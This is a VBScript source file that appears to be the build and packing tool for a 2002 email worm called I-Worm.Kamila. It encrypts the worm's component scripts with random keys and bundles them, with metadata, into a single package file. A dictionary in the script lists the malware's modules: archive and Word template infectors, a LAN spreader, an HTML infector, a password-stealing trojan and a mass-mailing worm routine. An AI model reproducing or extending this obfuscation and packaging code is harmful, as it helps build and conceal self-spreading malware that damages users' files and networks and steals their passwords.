Option Explicit

Dim fso

Function RetRndKey(intLength)
	Dim i,strKey
	Dim intLow,intHigh

	intLow=48
	intHigh=122

	Randomize Timer
	strKey=""
	For i=1 To intLength
		strKey=strKey & Chr(intLow+(intHigh-intLow+1)*Rnd)
	Next
	RetRndKey=strKey
End Function

Function Encrypt(strFile,strKey)
	Dim strOut,strCh,strChKey,strIn
	Dim file
	Dim intCode, intOffset, intUpper, k, i
	Dim strRes
	
	intOffset=30 'this variable defines the stand-alone offset
	intUpper=125 'not including UNI-characters

	Set file=fso.OpenTextFile(strFile,1)
	strRes=""
	While Not file.AtEndOfStream
		strIn=file.Read(Len(strKey))
		strRes=strRes & "'"
		For i=1 To Len(strIn)  
			strCh=Mid(strIn,i,1)
			strChKey=Mid(strKey,i,1)
			intCode=Asc(strCh)+Asc(strChKey)
			if intCode<intOffset Then intCode=intCode+intOffset
			If intCode>intUpper Then intCode=intCode-intUpper
			If intCode=10 Then intCode=126
			If intCode=13 Then intCode=127
		 	strRes=strRes & Chr(intCode)
		Next
		strRes=strRes & vbCrLf
	Wend
	file.Close
	Set file=Nothing
	Encrypt=strRes
End Function


Sub Decrypt(strFile,strKey)
	Dim strCh,strChKey,strIn
	Dim out, file
	Dim intCode, intOffset, intUpper, k, i,t

	intOffset=30 'this variable defines the stand-alone offset
	intUpper=125 'not including UNI-characters
	t=0

	Set file=fso.OpenTextFile(strFile,1)
	Set out=fso.CreateTextFile(Left(strFile,Len(strFile)-3) & "dcs",2)
	While Not file.AtEndOfStream
		strIn=file.readLine
		strIn=Mid(strIn,2) 'new
		k=Len(strIn)
		For i=1 to k
			If t>=Len(strKey) Then t=0
			t=t+1
			strCh=Mid(strIn,i,1)
			strChKey=Mid(strKey,t,1)
			If Asc(strCh)=126 Then strCh=Chr(10)
			If Asc(strCh)=127 Then strCh=Chr(13)
			intCode=Asc(strCh)-Asc(strChKey)
			If intCode<intOffset Then intCode=intCode+intUpper
			If intCode>intUpper Then intCode=intCode-intUpper
			out.write(chr(intCode))
		Next
	Wend
	file.Close
	out.Close
	Set file=Nothing
	Set out=Nothing
End Sub


Dim strKey, strInstKey, strAlg, strExt, strEnc
Dim fldr,file1
Dim fileOut, fileEnc
Dim dictComm, dictPrio
Dim blInstall
Set dictComm=WScript.CreateObject("Scripting.Dictionary")
dictComm.Add "ARCInfector", " <Infects all archives in format of rar & zip>"
dictComm.Add "WordInfector"," <keeping in normal template>"
dictComm.Add "FileSeeker", " <seeking for the needed file formats>"
dictComm.Add "LANSeeker", " <makes vulnerable the LAN>"
dictComm.Add "HTMLInfector"," <infects blank documents in mime-html format>"
dictComm.Add "PSWTrojan", " <a simple password trojan - very, very>"
dictComm.Add "Installer", " <procedure storage to install the components>"
dictComm.Add "EnumRecipients"," <the WORM>"
dictComm.Add "X-Force", " <that's just nice thing>"
Set dictPrio=WScript.CreateObject("Scripting.Dictionary")
dictPrio.Add "ARCInfector", "necessary"
dictPrio.Add "WordInfector", "necessary"
dictPrio.Add "FileSeeker", "first"
dictPrio.Add "LANSeeker", "necessary"
dictPrio.Add "HTMLInfector", "necessary"
dictPrio.Add "PSWTrojan", "necessary"
dictPrio.Add "Installer", "first"
dictPrio.Add "EnumRecipients", "necessary"
dictPrio.Add "X-Force", "first"
Set fso=WScript.CreateObject("Scripting.FileSystemObject")
Set fldr=fso.GetFolder("D:\UTILS\Otto Gutenberg\I-Worm.Kamila\Components")
Set fileOut=fso.CreateTExtFile("D:\new.cmp",True)
For Each file1 In fldr.Files
	If UCase(Right(file1.Name,3))="VBS" And InStr(file1.Name,"_install")=0 Then
		blInstall=fso.FileExists(Left(file1.Path,Len(file1.Path)-4) & "_install.vbs")
		strKey=RetRndKey(128)
		strInstKey=RetRndKey(128)
		strAlg="symbolic"
		strExt="VBS"
		If Not blInstall Then
			strAlg="none"
			strInstKey="[none]"
			strExt=""
		End If
		fileOut.WriteLine ""
		fileOut.WriteLine ""
		fileOut.WriteLine "'ID:" & Left(file1.Name,Len(file1.Name)-4)
		fileOut.WriteLine "'VERSION:1"
		fileOut.WriteLine "'COPYRIGHT: 2002 (c) Otto von Gutenberg"
		fileOut.WriteLine "'COMMENTS: " & dictComm.Item(Left(file1.Name,Len(file1.Name)-4))
		fileOut.WriteLine "'KEY:" & strKey
		fileOut.WriteLine "'INSTALL_KEY:" & strInstKey
		fileOut.WriteLine "'ENCRYPTION_ALGORITHM:symbolic"
		fileOut.WriteLine "'INSTALL_ENC_ALG:" & strAlg
		fileOut.WriteLine "'PRIORITY:" & dictPrio.Item(Left(file1.Name,Len(file1.Name)-4))
		fileOut.WriteLine "'INSTALL_EXT:" & strExt
		fileOut.WriteLine "'EXTENSION:VBS"
		fileOut.WriteLine "'<INSTALL>"
		If blInstall Then
			fileOut.Write Encrypt(Left(file1.Path,Len(file1.Path)-4) & "_install.vbs",strInstKey)
		End If
		fileOut.WriteLine "'</INSTALL>"
		fileOut.WriteLine "'<STREAM>"
		strEnc=Encrypt(file1.Path,strKey)
		Set fileEnc=fso.CreateTextFile(Left(file1.Path,Len(file1.Path)-4) & ".crs",True)
		fileEnc.Write strEnc
		fileEnc.Close
		Decrypt Left(file1.Path,Len(file1.Path)-4) & ".crs", strKey
		fileOut.Write strEnc
		fileOut.WriteLine "'</STREAM>"
	End If
Next
fileOut.Close